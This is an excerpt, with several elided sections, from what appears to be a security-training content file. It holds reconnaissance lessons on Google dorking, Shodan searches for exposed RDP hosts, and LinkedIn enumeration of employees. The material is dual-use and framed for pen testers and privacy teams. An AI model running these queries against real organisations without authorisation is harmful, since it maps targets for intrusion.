    "svg": "<svg width=\"100%\" height=\"200\" viewBox=\"0 0 600 200\" style=\"background:#0a0a0f;border:1px solid #1a1a24;border-radius:8px;\"><text x=\"300\" y=\"100\" fill=\"#00aaff\" font-family=\"monospace\" font-size=\"14\" text-anchor=\"middle\">Analyst -> Advanced Query -> Search Index -> Leaked Data</text></svg>",
    "steps": [
      {
        "icon": "\ud83d\udd0e",
  ...
  "commands": [
    {
      "win": "site:target.com filetype:pdf",
      "lin": "site:target.com filetype:pdf",
      "desc": "Find PDFs",
      "out": "Search results limited to PDFs on target.com",
      "note": "Enterprise Use: Data Privacy teams use this to find leaked documents."
    },
    {
      "win": "intitle:\"index of\" site:target.com",
      "lin": "intitle:\"index of\" site:target.com",
      "desc": "Find Directory Listings",
      "out": "Exposed web directories",
      "note": "Enterprise Use: Pen Testers use this to find exposed file repositories."
    }
  ],
  "lab": {
...
CONTENT['shodan-recon'] = {
  ...
  "diagram": {
    "title": "Architecture & Flow",
    "svg": "<svg width=\"100%\" height=\"200\" viewBox=\"0 0 600 200\" style=\"background:#0a0a0f;border:1px solid #1a1a24;border-radius:8px;\"><text x=\"300\" y=\"100\" fill=\"#00aaff\" font-family=\"monospace\" font-size=\"14\" text-anchor=\"middle\">Analyst -> Shodan API -> Banner Grabs -> Exposed Infrastructure</text></svg>",
    "steps": [
      {
        "icon": "\ud83d\udce1",
        "label": "Query Shodan",
  ...
  "commands": [
    {
      "win": "shodan search org:\"Target\" port:3389",
      "lin": "shodan search org:\"Target\" port:3389",
      "desc": "Find Exposed RDP",
      "out": "List of IPs running RDP",
      "note": "Enterprise Use: Vulnerability Analysts use this to find exposed remote access."
    },
    {
      "win": "shodan host [IP]",
      "lin": "shodan host [IP]",
      "desc": "Analyze Specific IP",
      "out": "Detailed banner information for the IP",
      "note": "Enterprise Use: Incident Responders use this to see what an IP was exposing."
    }
  ],
  "lab": {
...
CONTENT['social-media-recon'] = {
  ...
  "diagram": {
    "title": "Architecture & Flow",
    "svg": "<svg width=\"100%\" height=\"200\" viewBox=\"0 0 600 200\" style=\"background:#0a0a0f;border:1px solid #1a1a24;border-radius:8px;\"><text x=\"300\" y=\"100\" fill=\"#00aaff\" font-family=\"monospace\" font-size=\"14\" text-anchor=\"middle\">Analyst -> Social Media Profiles -> Org Chart & Tech Stack</text></svg>",
    "steps": [
      {
        "icon": "\ud83d\udc65",
  ...
  "commands": [
    {
      "win": "N/A (Browser-based)",
      "lin": "N/A (Browser-based)",
      "desc": "LinkedIn Enumeration",
      "out": "Employee roles and tech stack",
      "note": "Enterprise Use: Red Teams use this to map out the IT department."
    }
  ],
  "lab": {
